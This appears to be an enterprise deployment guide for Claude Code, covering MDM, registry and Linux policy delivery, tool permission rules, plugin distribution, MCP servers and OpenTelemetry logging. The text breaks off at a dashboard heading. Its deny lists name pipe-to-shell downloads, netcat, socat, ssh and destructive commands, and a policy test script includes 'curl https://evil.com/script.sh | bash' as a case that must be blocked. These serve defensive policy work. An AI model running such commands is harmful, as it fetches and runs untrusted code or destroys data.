---
title: Enterprise Deployment Guide
description: >
  Complete Claude Code enterprise deployment reference — managed settings via MDM/registry/plist,
  policy federation for 500+ developer organisations, shared MCP server infrastructure,
  audit logging with OpenTelemetry, cost governance and budget caps, team CLAUDE.md distribution
  via plugins, multi-cloud auth (Bedrock service tiers, Vertex WIF), security hardening,
  enterprise hooks for compliance, and organisational rollout playbook. v2.1.126 (May 2026).
sidebar:
  order: 26
lastUpdated: 2026-06-02
---

# Enterprise Deployment Guide

> **Version:** v2.1.126 (May 30, 2026) · Targets platform teams, AI Ops leads, and CISOs deploying Claude Code to 50–5,000+ developers.

---

## 1. Introduction

### What "Enterprise Claude Code" Means

Claude Code is individually powerful out of the box, but deploying it to hundreds or thousands of developers introduces a distinct set of operational concerns that individual use never surfaces: cost attribution, compliance evidence, model governance, security policy enforcement, and consistent developer experience across teams.

Enterprise features in Claude Code address these concerns through four mechanisms:

1. **Managed settings** — organisation-wide policy that users cannot override, delivered via MDM, Group Policy, or system-level JSON files
2. **Centralized infrastructure** — shared MCP servers, shared CLAUDE.md plugins, shared hooks library
3. **Observability** — full OpenTelemetry instrumentation of every tool call, session event, and cost unit
4. **Multi-cloud auth** — AWS Bedrock and GCP Vertex AI integration, including IAM-native auth with no long-lived API keys

### Who This Guide Is For

| Role | What you'll use |
|------|----------------|
| **Platform / DevEx teams** | Managed settings deployment, plugin distribution, MCP server infrastructure |
| **Security / CISO** | Compliance hooks, secret scanning, audit logging, RBAC for tools |
| **AI Ops / FinOps** | Cost governance, budget caps, OTEL dashboards, per-team allocation |
| **CTO / Engineering leadership** | Rollout playbook, success metrics, cloud provider strategy |

### What Changes at Enterprise Scale

Individual Claude Code use has two configuration layers: personal (`~/.claude/settings.json`) and project (`.claude/settings.json`). Enterprise adds two more:

```
ENTERPRISE SETTINGS (MDM / GPO / managed JSON)
    ↓ overrides everything below
USER SETTINGS (~/.claude/settings.json)
    ↓ overrides project below
PROJECT SETTINGS (.claude/settings.json)
    ↓ base layer
DEFAULTS (Claude Code built-ins)
```

The enterprise layer is **mandatory** — users cannot see, edit, or override it. This is the critical distinction from individual use.

---

## 2. Managed Settings Architecture

### What Managed Settings Do

Managed settings are read at process startup, before any user or project configuration is applied. They establish a hard floor that all other configuration sits on top of. If managed settings say `"model": "claude-sonnet-4-6"` and a user's `~/.claude/settings.json` says `"model": "claude-opus-4-7"`, Claude Code uses Sonnet. The enterprise setting wins without error or warning to the user.

### The Managed Settings File

The cross-platform path for managed settings is:

```
/etc/claude-code/managed-settings.json          # Linux
C:\ProgramData\Anthropic\ClaudeCode\managed-settings.json  # Windows
/Library/Application Support/ClaudeCode/managed-settings.json  # macOS (file-based)
```

You can override the path with the environment variable `CLAUDE_CODE_MANAGED_SETTINGS_PATH`:

```bash
export CLAUDE_CODE_MANAGED_SETTINGS_PATH=/opt/corp/claude/managed-settings.json
```

This is the preferred approach for Linux fleet management — set the env var in `/etc/environment` or your MDM's environment injection mechanism.

### Full Managed Settings Schema

```json
{
  "model": "claude-sonnet-4-6",
  "maxBudgetUsd": 5.00,
  "maxBudgetTokenCap": 500000,
  "maxEffortLevel": "high",
  "permissionMode": "default",
  "defaultPermissionMode": "default",
  "disableTelemetryOverride": true,
  "disableAutoUpdate": true,
  "disableUsageStats": false,
  "allowedModels": [
    "claude-sonnet-4-6",
    "claude-haiku-4-5"
  ],
  "permissions": {
    "allow": [
      "Read",
      "Write",
      "Edit",
      "MultiEdit",
      "Glob",
      "Grep",
      "Bash(git *)",
      "Bash(npm *)",
      "Bash(dotnet *)",
      "TodoRead",
      "TodoWrite",
      "WebFetch"
    ],
    "deny": [
      "Bash(rm -rf *)",
      "Bash(sudo *)",
      "Bash(curl * | bash)",
      "Bash(wget * -O - | sh)",
      "Bash(ssh *)",
      "Bash(scp *)",
      "Bash(nc *)",
      "Bash(ncat *)",
      "Bash(socat *)"
    ]
  },
  "otelEndpoint": "https://otel.internal.corp.com:4318",
  "otelServiceName": "claude-code",
  "otelResourceAttributes": {
    "deployment.environment": "production",
    "org.name": "acme-corp"
  },
  "mcpServers": {
    "corp-tools": {
      "url": "https://mcp.internal.corp.com/tools",
      "auth": "service-account"
    }
  }
}
```

Settings that appear in managed config **cannot be overridden** by user or project settings. Settings absent from managed config can be freely set by users within those layers.

### macOS MDM via Managed Preferences (Jamf / Mosyle / Kandji)

On macOS with an MDM provider, deploy as a configuration profile using the `com.anthropic.claudecode` preference domain. Create a `.mobileconfig` payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>PayloadType</key>
      <string>com.anthropic.claudecode</string>
      <key>PayloadVersion</key>
      <integer>1</integer>
      <key>PayloadIdentifier</key>
      <string>com.corp.mdm.claudecode.policy</string>
      <key>PayloadUUID</key>
      <string>A1B2C3D4-E5F6-7890-ABCD-EF1234567890</string>
      <key>PayloadDisplayName</key>
      <string>Claude Code Enterprise Policy</string>
      <!-- Policy keys below are merged into managed-settings.json -->
      <key>model</key>
      <string>claude-sonnet-4-6</string>
      <key>disableAutoUpdate</key>
      <true/>
      <key>disableTelemetryOverride</key>
      <true/>
      <key>maxBudgetUsd</key>
      <real>5.0</real>
      <key>otelEndpoint</key>
      <string>https://otel.internal.corp.com:4318</string>
    </dict>
  </array>
  <key>PayloadDescription</key>
  <string>Manages Claude Code enterprise policy settings</string>
  <key>PayloadDisplayName</key>
  <string>Claude Code Policy</string>
  <key>PayloadIdentifier</key>
  <string>com.corp.mdm.claudecode</string>
  <key>PayloadOrganization</key>
  <string>Acme Corp</string>
  <key>PayloadRemovalDisallowed</key>
  <true/>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadUUID</key>
  <string>B2C3D4E5-F6A7-8901-BCDE-F12345678901</string>
  <key>PayloadVersion</key>
  <integer>1</integer>
</plist>
```

Claude Code reads managed preferences from `/Library/Managed Preferences/com.anthropic.claudecode.plist`, which is where macOS MDM writes profile payloads. Claude Code merges this with the file-based managed settings — plist values take precedence over the JSON file if both are present.

**Deploy via Jamf:**
1. Profiles → Computer Profiles → + New
2. General → payload type: Custom
3. Upload the `.mobileconfig` file
4. Scope to your Claude Code user group

### Windows GPO and MDM via Registry

Claude Code reads enterprise settings from the registry key:

```
HKLM\SOFTWARE\Anthropic\ClaudeCode\Policy
```

For user-scoped MDM (Intune), settings can also be pushed to:

```
HKCU\SOFTWARE\Policies\Anthropic\ClaudeCode
```

`HKLM` (machine-wide) takes precedence over `HKCU` (user-scoped).

**Registry value types and keys:**

| Value Name | Registry Type | Example |
|------------|--------------|---------|
| `Model` | REG_SZ | `claude-sonnet-4-6` |
| `MaxBudgetUsd` | REG_DWORD | `500` (cents — divide by 100) |
| `DisableAutoUpdate` | REG_DWORD | `1` (true) or `0` (false) |
| `DisableTelemetryOverride` | REG_DWORD | `1` |
| `OtelEndpoint` | REG_SZ | `https://otel.internal.corp.com:4318` |
| `AllowedModels` | REG_MULTI_SZ | newline-separated model IDs |
| `MaxEffortLevel` | REG_SZ | `high` |

**Deploy via Intune (Windows MDM):**

1. Devices → Configuration → Create Policy → Windows 10/11 → Settings Catalog
2. Search for "Custom OMA-URI"
3. Add URI: `./Device/Vendor/MSFT/Policy/Config/ADMX_ClaudeCode/Model`
4. Data type: String, Value: `claude-sonnet-4-6`

Or deploy via Group Policy using an ADMX template. Anthropic provides an ADMX file at `https://downloads.anthropic.com/claude-code/admx/ClaudeCode.admx`.

**PowerShell deployment script:**

```powershell
# enterprise-claude-policy.ps1 — run as SYSTEM via Intune or SCCM
$policyRoot = "HKLM:\SOFTWARE\Anthropic\ClaudeCode\Policy"

if (-not (Test-Path $policyRoot)) {
    New-Item -Path $policyRoot -Force | Out-Null
}

Set-ItemProperty -Path $policyRoot -Name "Model"                    -Value "claude-sonnet-4-6"
Set-ItemProperty -Path $policyRoot -Name "MaxBudgetUsd"             -Value 500 -Type DWord  # $5.00
Set-ItemProperty -Path $policyRoot -Name "DisableAutoUpdate"        -Value 1   -Type DWord
Set-ItemProperty -Path $policyRoot -Name "DisableTelemetryOverride" -Value 1   -Type DWord
Set-ItemProperty -Path $policyRoot -Name "MaxEffortLevel"           -Value "high"
Set-ItemProperty -Path $policyRoot -Name "OtelEndpoint"             -Value "https://otel.internal.corp.com:4318"

Write-Output "Claude Code enterprise policy applied."
```

### Linux Fleet Management

For Linux, use the `CLAUDE_CODE_MANAGED_SETTINGS_PATH` environment variable in `/etc/environment`:

```bash
# /etc/environment — applies to all login sessions
CLAUDE_CODE_MANAGED_SETTINGS_PATH=/etc/claude-code/managed-settings.json
```

Distribute `/etc/claude-code/managed-settings.json` via Ansible, Chef, Puppet, or your preferred configuration management tool.

**Ansible task:**

```yaml
# roles/claude-code-policy/tasks/main.yml
- name: Create Claude Code policy directory
  file:
    path: /etc/claude-code
    state: directory
    mode: '0755'
    owner: root
    group: root

- name: Deploy managed settings
  template:
    src: managed-settings.json.j2
    dest: /etc/claude-code/managed-settings.json
    mode: '0644'
    owner: root
    group: root
  notify: reload_claude_policy

- name: Set CLAUDE_CODE_MANAGED_SETTINGS_PATH in /etc/environment
  lineinfile:
    path: /etc/environment
    line: 'CLAUDE_CODE_MANAGED_SETTINGS_PATH=/etc/claude-code/managed-settings.json'
    state: present
```

### Lockable vs. User-Overridable Settings

| Setting | Managed (locked) | User-overridable |
|---------|-----------------|-----------------|
| `model` | Yes — prevents expensive model use | Yes — if not in managed |
| `allowedModels` | Yes — whitelist | Not applicable |
| `maxBudgetUsd` | Yes — hard ceiling | User can set *lower* |
| `maxEffortLevel` | Yes — caps effort tier | User can use lower |
| `permissions.deny` | Yes — org-wide deny rules | User can add more denies |
| `permissions.allow` | Yes — base allowlist | User can add more allows |
| `disableAutoUpdate` | Yes — freeze version | No |
| `disableTelemetryOverride` | Yes — prevent DISABLE_TELEMETRY | No |
| `otelEndpoint` | Yes — force corporate OTEL | No |
| `defaultPermissionMode` | Yes — floor mode | User can set stricter |
| `mcpServers` (managed servers) | Yes — added automatically | User adds their own on top |

The principle: managed settings establish **minimums and maximums**. Users can be more restrictive (lower budget, stricter permissions) but not less.

---

## 3. Tool Allowlist & Blocklist Policy

### Settings File Permissions Blocks

Allowlists and blocklists live in the `permissions` block of `settings.json` at either project level (`.claude/settings.json`) or user level (`~/.claude/settings.json`), and in managed settings for org-wide enforcement.

```json
{
  "permissions": {
    "allow": ["ToolName(pattern)", ...],
    "deny":  ["ToolName(pattern)", ...]
  }
}
```

**Evaluation order:** `deny` always beats `allow`. Enterprise managed `deny` beats project `deny`. If a tool matches both a managed `deny` and a project `allow`, the `deny` wins.

### Wildcard Pattern Syntax

```
Pattern                        Matches
─────────────────────────────────────────────────────────────────────────
Bash(git *)                    git status, git log, git diff, git commit
Bash(git status)               git status only (exact match)
Bash(npm run *)                npm run test, npm run build, npm run lint
Bash(rm *)                     rm with any arguments
Bash(rm -rf *)                 rm -rf <anything> (more specific)
Bash(sudo *)                   any sudo invocation
Bash(curl *)                   any curl invocation
Read                           Read tool, any file path
Read(/home/*/projects/**)      Read only within user project dirs
Write(/tmp/**)                 Write only to /tmp/ subtree
mcp__github__*                 all GitHub MCP tools
mcp__github__get_*             only read (get_) GitHub MCP tools
mcp__internal_db__write_*      only write tools from internal_db server
WebFetch(https://docs.*)       WebFetch restricted to docs subdomain only
*                              all tools (use only with deny list)
```

### Global vs. Project-Level Strategy

The recommended layered strategy for enterprise:

```
LAYER 1 — Managed (org-wide, cannot override):
  deny: destructive operations, network exfiltration patterns, sudo

LAYER 2 — Team settings (~/.claude/settings.json via onboarding script):
  allow: team's standard toolset
  deny: additional team-specific restrictions

LAYER 3 — Project settings (.claude/settings.json in repo):
  allow: project-specific tools (e.g., specific MCP server tools)
  deny: project-specific restrictions (e.g., no prod DB writes)
```

### Example: Block Destructive Operations Org-Wide

Place in managed settings:

```json
{
  "permissions": {
    "deny": [
      "Bash(rm -rf *)",
      "Bash(rm -r *)",
      "Bash(find * -delete)",
      "Bash(find * -exec rm *)",
      "Bash(git push --force *)",
      "Bash(git push -f *)",
      "Bash(git reset --hard *)",
      "Bash(dd *)",
      "Bash(mkfs *)",
      "Bash(fdisk *)",
      "Bash(sudo *)",
      "Bash(su *)",
      "Bash(chmod 777 *)",
      "Bash(chown root *)",
      "Bash(curl * | bash)",
      "Bash(curl * | sh)",
      "Bash(wget * | bash)",
      "Bash(wget * | sh)",
      "Bash(pip install * --break-system-packages)",
      "Bash(npm install -g *)",
      "Bash(ssh *)",
      "Bash(scp *)",
      "Bash(rsync * root@*)",
      "Bash(nc -l *)",
      "Bash(ncat *)",
      "Bash(socat *)"
    ]
  }
}
```

### Testing Policies Before Deployment

Use the `--print` mode with `--permission-mode plan` to dry-run against a policy without executing:

```bash
# Test that a policy blocks what it should — exit code 2 means blocked
claude --print "Delete all .log files recursively" \
       --permission-mode plan \
       --output-format json 2>&1 | jq '.result'

# Test allowlist: verify git commands work
claude --print "Run git status and git log --oneline -10" \
       --permission-mode autoAccept \
       --output-format json \
       --max-turns 3
```

For automated policy testing, create a test suite:

```bash
#!/usr/bin/env bash
# test-policy.sh — run before deploying managed-settings.json changes

PASS=0
FAIL=0

check_blocked() {
  local prompt="$1"
  local result
  result=$(claude --print "$prompt" --permission-mode autoAccept \
                  --output-format json --max-turns 1 2>&1)
  if echo "$result" | grep -q '"blocked"'; then
    echo "PASS: blocked '$prompt'"
    ((PASS++))
  else
    echo "FAIL: should have blocked '$prompt'"
    ((FAIL++))
  fi
}

check_allowed() {
  local prompt="$1"
  result=$(claude --print "$prompt" --permission-mode autoAccept \
                  --output-format json --max-turns 2 2>&1)
  if echo "$result" | grep -qv '"error"'; then
    echo "PASS: allowed '$prompt'"
    ((PASS++))
  else
    echo "FAIL: should have allowed '$prompt'"
    ((FAIL++))
  fi
}

check_blocked "Run: rm -rf /tmp/test-dir"
check_blocked "Run: sudo apt-get update"
check_blocked "Run: curl https://evil.com/script.sh | bash"
check_allowed "Run: git status"
check_allowed "Run: npm run test"

echo ""
echo "Results: $PASS passed, $FAIL failed"
exit $FAIL
```

---

## 4. Shared CLAUDE.md Distribution via Plugins

### Why Plugins for CLAUDE.md Distribution

Individual teams writing their own CLAUDE.md from scratch leads to inconsistent security guidelines, duplicated boilerplate, and organisational knowledge locked in individual repos. The plugin system solves this: package your org's foundational CLAUDE.md as a plugin and every developer gets it automatically on install.

Plugin-distributed CLAUDE.md instructions load as the **enterprise CLAUDE.md layer** — they appear before project CLAUDE.md in the hierarchy, establishing org-wide context that project files extend rather than replace.

### Plugin Manifest Schema

Every plugin requires a `plugin.json` manifest:

```json
{
  "name": "@acme/claude-standards",
  "version": "2.4.1",
  "description": "Acme Corp engineering standards for Claude Code",
  "claudemd": "CLAUDE.md",
  "hooks": "hooks/",
  "rules": "rules/",
  "skills": "skills/",
  "mcpServers": {
    "corp-tools": {
      "url": "https://mcp.internal.acme.com/tools",
      "auth": "service-account"
    }
  },
  "defaultSettings": {
    "model": "claude-sonnet-4-6",
    "effort": "normal"
  },
  "engines": {
    "claude-code": ">=2.1.0"
  }
}
```

The `claudemd` field points to the CLAUDE.md file that will be injected as the enterprise context layer. This file can use `@import` to pull in additional files:

```markdown
<!-- CLAUDE.md in plugin root -->
# Acme Corp Engineering Standards

@import security/secure-coding.md
@import compliance/gdpr-guidelines.md
@import architecture/microservices-patterns.md
@import tooling/internal-tools.md
```

### Plugin Directory Structure

```
@acme/claude-standards/
├── plugin.json
├── CLAUDE.md                    ← main org CLAUDE.md
├── security/
│   └── secure-coding.md         ← @imported
├── compliance/
│   ├── gdpr-guidelines.md
│   └── sox-controls.md
├── architecture/
│   └── microservices-patterns.md
├── tooling/
│   └── internal-tools.md
├── hooks/
│   ├── pre-file-write-secrets.sh
│   ├── post-bash-audit.sh
│   └── stop-ticket-summary.sh
├── rules/
│   ├── api-design.md
│   └── testing-standards.md
└── skills/
    ├── create-jira-ticket/
    │   └── SKILL.md
    └── deploy-service/
        └── SKILL.md
```

### CLAUDE_PLUGIN_ROOT Deployment Options

**Option 1: Private npm registry (recommended for large orgs)**

```bash
# Configure developer machines to use private registry
npm config set @acme:registry https://npm.internal.acme.com

# Install plugin globally — all new sessions pick it up
npm install -g @acme/claude-standards

# Or install at user level for Claude Code
claude plugins install @acme/claude-standards
```

Deploy via onboarding script run on new machine provisioning:

```bash
#!/usr/bin/env bash
# onboard-claude-code.sh
set -euo pipefail

# Configure private registry
npm config set @acme:registry https://npm.internal.acme.com

# Install enterprise plugin
claude plugins install @acme/claude-standards@latest

# Install team plugin if applicable
TEAM_PLUGIN=$(detect_team_from_ldap)
if [ -n "$TEAM_PLUGIN" ]; then
  claude plugins install "@acme/claude-${TEAM_PLUGIN}"
fi

echo "Claude Code enterprise setup complete."
echo "Plugin version: $(claude plugins list | grep @acme/claude-standards)"
```

**Option 2: Git-based install (for regulated environments without npm)**

```bash
# Install directly from internal Git server
claude plugins install git+https://git.internal.acme.com/platform/claude-standards.git

# Pin to a specific release tag
claude plugins install git+https://git.internal.acme.com/platform/claude-standards.git#v2.4.1
```

**Option 3: Local filesystem (air-gapped environments)**

```bash
# Distribute plugin as tarball via software center
curl -sL https://software.internal.acme.com/claude-standards-2.4.1.tgz \
  | claude plugins install --from-tarball -
```

### Plugin Versioning and Update Management

For enterprise deployments, **never use floating latest**. Pin versions explicitly:

```bash
# Pin in managed settings (prevents user upgrades)
# managed-settings.json
{
  "plugins": {
    "@acme/claude-standards": {
      "version": "2.4.1",
      "locked": true
    }
  }
}
```

Version rollout strategy:

```
v2.4.0 → canary (5 platform team members)
       → if stable after 48h:
v2.4.0 → early adopters (50 volunteers)
       → if stable after 1 week:
v2.4.0 → general rollout (500+ engineers, staged by team)
```

Use semantic versioning with a clear changelog. Breaking changes (new deny rules, removed tools) are major version bumps with a migration guide.

### Example: Org-Wide Security Guidelines Plugin

```markdown
<!-- CLAUDE.md in @acme/claude-standards plugin -->
# Acme Corp Engineering Standards

## Security Requirements (Mandatory)

These guidelines are non-negotiable across all Acme engineering work.

### Secret Handling
- NEVER write secrets, API keys, passwords, or tokens directly in code
- NEVER commit files matching: *.env, *.pem, *_key, *secret*, *password*
- Use Vault for all secret access: `vault kv get secret/service/<service-name>`
- Environment variables for secrets must be injected via CI/CD, never hardcoded

### Authentication
- All services must implement OAuth 2.0 with Acme's internal IdP (Okta)
- Session tokens expire in 4 hours (hard limit from security policy SEC-004)
- MFA required for any admin operation

### Dependency Policy
- New npm dependencies require security review via the package review board
- Python packages must be whitelisted in `/etc/acme/approved-pypi-packages.txt`
- No direct use of packages with known CVEs rated 7.0+ (CVSS)

### Logging
- Never log PII (names, emails, phone numbers, SSNs, card numbers)
- Log format: structured JSON with fields: timestamp, level, service, trace_id, message
- Minimum log level in production: WARN (DEBUG only in dev/staging)

## Internal Tooling

Our MCP server provides:
- `corp_tools::jira_create_ticket` — create Jira tickets
- `corp_tools::vault_get_secret` — retrieve secrets from Vault
- `corp_tools::internal_api_call` — call internal services

See https://wiki.internal.acme.com/claude-code for full tool documentation.
```

---

## 5. Shared MCP Server Infrastructure

### Architecture: Centralised HTTP vs. Distributed stdio

Individual developers typically run MCP servers locally via stdio (subprocess). Enterprise deployments should centralise these on HTTP MCP servers:

```
INDIVIDUAL (stdio)                    ENTERPRISE (HTTP MCP)
──────────────────────                ──────────────────────────────────────
Developer laptop                      Central MCP server cluster
  └─ claude process                     └─ mcp-server-1 (active)
       └─ stdio → local mcp-server       └─ mcp-server-2 (active)
                                         └─ mcp-server-3 (standby)
                                                  │
                                          Load balancer (nginx / ALB)
                                                  │
                                    ┌─────────────┼─────────────┐
                                    │             │             │
                                  Vault       Internal       Jira
                                  API         DBs           API
```

**Benefits of centralised HTTP MCP:**

- One place to update tool schemas when internal APIs change
- Authentication handled at the server level — developers don't need credentials
- Centralised audit trail of all tool calls (not per-developer)
- Horizontal scaling for high-concurrency enterprise use
- Single point for rate limiting and quota enforcement

### HTTP MCP Server Configuration

Register centralised MCP servers in managed settings:

```json
{
  "mcpServers": {
    "corp-tools": {
      "type": "http",
      "url": "https://mcp.internal.acme.com/v1/mcp",
      "auth": {
        "type": "oauth2",
        "tokenEndpoint": "https://auth.internal.acme.com/oauth/token",
        "clientCredentials": {
          "clientIdEnvVar": "CLAUDE_CODE_MCP_CLIENT_ID",
          "clientSecretEnvVar": "CLAUDE_CODE_MCP_CLIENT_SECRET"
        }
      },
      "timeout": 30000,
      "retries": 3
    },
    "data-platform": {
      "type": "http",
      "url": "https://mcp-data.internal.acme.com/v1/mcp",
      "auth": {
        "type": "mtls",
        "certPath": "/etc/acme/certs/claude-code-client.pem",
        "keyPath": "/etc/acme/certs/claude-code-client-key.pem"
      }
    }
  }
}
```

The `CLAUDE_CODE_MCP_CLIENT_ID` and `CLAUDE_CODE_MCP_CLIENT_SECRET` are injected by the MDM or loaded from the system keychain — they are never stored in a config file on disk.

### Service Mesh Integration

For organisations running Istio, Linkerd, or similar:

```yaml
# kubernetes/mcp-server-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: claude-mcp-server
  namespace: platform-tools
spec:
  replicas: 3
  selector:
    matchLabels:
      app: claude-mcp-server
  template:
    metadata:
      annotations:
        sidecar.istio.io/inject: "true"
        prometheus.io/scrape: "true"
        prometheus.io/port: "9090"
      labels:
        app: claude-mcp-server
        version: "v2.1.4"
    spec:
      serviceAccountName: claude-mcp-server
      containers:
      - name: mcp-server
        image: registry.internal.acme.com/platform/claude-mcp-server:v2.1.4
        ports:
        - containerPort: 8080
          name: http
        - containerPort: 9090
          name: metrics
        env:
        - name: VAULT_ADDR
          value: "https://vault.internal.acme.com"
        - name: VAULT_ROLE
          value: "claude-mcp-server"
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 10
          periodSeconds: 30
        readinessProbe:
          httpGet:
            path: /ready
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 10
        resources:
          requests:
            memory: "256Mi"
            cpu: "250m"
          limits:
            memory: "512Mi"
            cpu: "500m"
---
apiVersion: v1
kind: Service
metadata:
  name: claude-mcp-server
  namespace: platform-tools
spec:
  selector:
    app: claude-mcp-server
  ports:
  - name: http
    port: 443
    targetPort: 8080
  type: ClusterIP
```

### Authentication Patterns

**OAuth 2.0 Client Credentials (recommended for service-to-service)**

```python
# mcp_server/auth.py
from functools import wraps
import jwt
import httpx

JWKS_URI = "https://auth.internal.acme.com/.well-known/jwks.json"

async def verify_claude_code_token(token: str) -> dict:
    """Verify that the request comes from an authorised Claude Code instance."""
    async with httpx.AsyncClient() as client:
        jwks = await client.get(JWKS_URI)

    key = jwt.algorithms.RSAAlgorithm.from_jwk(
        next(k for k in jwks.json()["keys"] if k["kid"] == jwt.get_unverified_header(token)["kid"])
    )

    claims = jwt.decode(
        token,
        key=key,
        algorithms=["RS256"],
        audience="mcp.internal.acme.com"
    )

    # Enforce that client is in approved list
    if claims["client_id"] not in APPROVED_CLIENT_IDS:
        raise PermissionError(f"Unapproved client: {claims['client_id']}")

    return claims
```

**mTLS (recommended for highest-security environments)**

```nginx
# nginx/mcp-server.conf
server {
    listen 443 ssl;
    server_name mcp.internal.acme.com;

    ssl_certificate     /etc/ssl/acme/server.pem;
    ssl_certificate_key /etc/ssl/acme/server-key.pem;

    # Require client certificate from internal CA
    ssl_client_certificate /etc/ssl/acme/internal-ca.pem;
    ssl_verify_client on;
    ssl_verify_depth 2;

    location / {
        # Pass verified client identity as header
        proxy_set_header X-Client-CN   $ssl_client_s_dn_cn;
        proxy_set_header X-Client-Cert $ssl_client_escaped_cert;
        proxy_pass http://claude-mcp-server:8080;
    }
}
```

### Tool Schema Governance

For enterprise MCP servers, establish governance for the tools you expose to Claude:

```json
{
  "name": "internal_db_query",
  "description": "Execute a read-only SQL query against the internal analytics database. Returns up to 1000 rows. Use for reporting and data analysis only. NEVER use for PII data (use the data-platform server for GDPR-controlled data).",
  "inputSchema": {
    "type": "object",
    "properties": {
      "query": {
        "type": "string",
        "description": "SQL SELECT statement. Must begin with SELECT. INSERT/UPDATE/DELETE/DROP are rejected.",
        "maxLength": 4096
      },
      "database": {
        "type": "string",
        "enum": ["analytics", "metrics", "reporting"],
        "description": "Target database. Only approved databases are accessible."
      }
    },
    "required": ["query", "database"]
  }
}
```

Tool description rules for enterprise:
- **Max 512 characters** in description (Claude truncates at ~600, keep shorter for reliable parsing)
- Include what the tool does NOT do (negative scoping reduces misuse)
- Version tools using a `X-Tool-Version` response header
- Deprecate tools with a `deprecated: true` flag and `deprecatedAt` date; remove after 90 days

---

## 6. Audit Logging with OpenTelemetry

### OTEL Configuration

Claude Code emits OpenTelemetry traces for every tool call, session event, and API interaction. Configure the OTEL exporter via environment variables or managed settings:

```bash
# Environment variables (set via MDM or /etc/environment)
export OTEL_EXPORTER_OTLP_ENDPOINT="https://otel.internal.acme.com:4318"
export OTEL_EXPORTER_OTLP_PROTOCOL="http/protobuf"        # or "grpc"
export OTEL_EXPORTER_OTLP_HEADERS="x-api-key=<your-key>"
export OTEL_SERVICE_NAME="claude-code"
export OTEL_RESOURCE_ATTRIBUTES="deployment.environment=production,org.team=$(id -un)"
export OTEL_EXPORTER_OTLP_COMPRESSION="gzip"
```

Or in managed settings (pushed via MDM, cannot be overridden):

```json
{
  "otelEndpoint": "https://otel.internal.acme.com:4318",
  "otelProtocol": "http/protobuf",
  "otelHeaders": {
    "x-api-key": "${CORP_OTEL_API_KEY}"
  },
  "otelServiceName": "claude-code",
  "otelResourceAttributes": {
    "deployment.environment": "production",
    "org.name": "acme-corp",
    "org.region": "${AWS_REGION}"
  }
}
```

Note: `${ENV_VAR}` syntax in managed settings resolves from the developer's environment at startup time, allowing dynamic attributes without hardcoding them in the managed config.

### Events Emitted

Claude Code emits spans for the following event categories:

| Event Category | Span Names | Key Attributes |
|---------------|-----------|----------------|
| Session lifecycle | `session.start`, `session.end`, `session.compact` | `session.id`, `session.model`, `session.project_root` |
| Tool calls | `tool.call`, `tool.result` | `tool.name`, `tool.input_hash`, `tool.duration_ms`, `tool.exit_code` |
| Hook execution | `hook.pre_tool`, `hook.post_tool`, `hook.stop` | `hook.name`, `hook.blocked`, `hook.duration_ms` |
| API calls | `api.request`, `api.response` | `model.id`, `tokens.input`, `tokens.output`, `tokens.cache_read`, `cost.usd` |
| Permissions | `permission.check`, `permission.denied` | `tool.name`, `policy.source`, `deny.reason` |
| MCP calls | `mcp.call`, `mcp.result` | `mcp.server`, `mcp.tool`, `mcp.duration_ms` |

### Span Structure

Each Claude Code trace covers one agent turn (from user prompt to final response). The parent span is `claude.turn` with child spans for each tool call:

```
claude.turn  [traceId=abc123, spanId=000001]
  │  session.id = "sess_abcdefg"
  │  model.id = "claude-sonnet-4-6"
  │  tokens.input = 4521
  │  tokens.output = 892
  │  tokens.cache_read = 3104
  │  cost.usd = 0.0031
  │
  ├─ tool.call  [spanId=000002, parentSpanId=000001]
  │    tool.name = "Read"
  │    tool.input = "/home/user/project/src/main.py"
  │    tool.duration_ms = 12
  │    tool.exit_code = 0
  │
  ├─ tool.call  [spanId=000003, parentSpanId=000001]
  │    tool.name = "Bash"
  │    tool.input = "npm run test"
  │    tool.duration_ms = 8432
  │    tool.exit_code = 0
  │
  └─ hook.post_tool  [spanId=000004, parentSpanId=000003]
       hook.name = "post-bash-audit"
       hook.blocked = false
       hook.duration_ms = 45
```

### Connecting to Observability Backends

**Datadog:**

```bash
# Use the Datadog OTEL agent as a local collector
export OTEL_EXPORTER_OTLP_ENDPOINT="http://localhost:4318"
# Datadog agent config (datadog.yaml):
# otlp_config:
#   receiver:
#     protocols:
#       http:
#         endpoint: 0.0.0.0:4318
```

**Grafana / Tempo:**

```bash
export OTEL_EXPORTER_OTLP_ENDPOINT="https://tempo.internal.acme.com:4318"
export OTEL_EXPORTER_OTLP_HEADERS="Authorization=Bearer ${GRAFANA_TOKEN}"
```

**Honeycomb:**

```bash
export OTEL_EXPORTER_OTLP_ENDPOINT="https://api.honeycomb.io"
export OTEL_EXPORTER_OTLP_HEADERS="x-honeycomb-team=${HONEYCOMB_API_KEY}"
export OTEL_SERVICE_NAME="claude-code"
```

**Azure Monitor (Application Insights):**

```bash
# Use the Azure Monitor OTEL exporter
export OTEL_EXPORTER_OTLP_ENDPOINT="https://<region>.dc.applicationinsights.azure.com/v2/track"
export OTEL_EXPORTER_OTLP_HEADERS="x-functions-key=${APPINSIGHTS_INSTRUMENTATION_KEY}"
```

### Cost Dashboard from OTEL Data

With OTEL traces flowing, build cost dashboards by querying the `cost.usd` and `tokens.*` attributes.

**Prometheus metric derivation (via OTEL Collector processor):**

```yaml
# otel-collector-config.yaml
processors:
  transform/claude_metrics:
    metric_statements:
    - context: datapoint
      statements:
      - set(attributes["developer"], resource.attributes["user.name"])
      - set(attributes["team"], resource.attributes["org.team"])
      - set(attributes["model"], attributes["model.id"])

exporters:
  prometheus:
    endpoint: "0.0.0.0:8889"
    namespace: claude_code

service:
  pipelines:
    metrics:
      processors: [transform/claude_metrics]
      exporters: [prometheus]
```

**Example Grafana queries:**

```promql
# Total cost per developer (last 7 days)
sum by (developer) (
  increase(claude_code_cost_usd_total[7d])
)

# Cost per model tier
sum by (model) (
  rate(claude_code_cost_usd_total[1h])
) * 3600

# Cache hit rate (lower cost = higher cache hit)
sum(rate(claude_code_tokens_cache_read_total[1h]))
/
sum(rate(claude_code_tokens_input_total[1h]))

# Tool usage heatmap (which tools fire most)
topk(20,
  sum by (tool_name) (
    increase(claude_code_tool_calls_total[24h])
  )
)
```

**Cost per developer dashboard panels:**
